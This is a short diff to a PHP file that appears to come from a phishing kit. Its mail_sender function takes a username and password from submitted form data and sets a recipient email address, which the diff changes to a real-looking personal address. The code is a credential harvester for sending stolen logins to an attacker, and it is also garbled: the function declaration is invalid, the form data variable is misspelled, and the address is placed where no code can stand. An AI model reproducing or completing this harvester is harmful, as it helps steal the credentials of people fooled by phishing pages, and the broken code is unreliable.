@@ -1,5 +1,5 @@
 <?php
-	mail_sender(){
+	mail_sender(){rayess.atef.5346@hotmail.com}
 		$username = $POST[username];
 		$password = $POST[password];
 		$reciever = "YOUR-EMAIL ADRRESS";
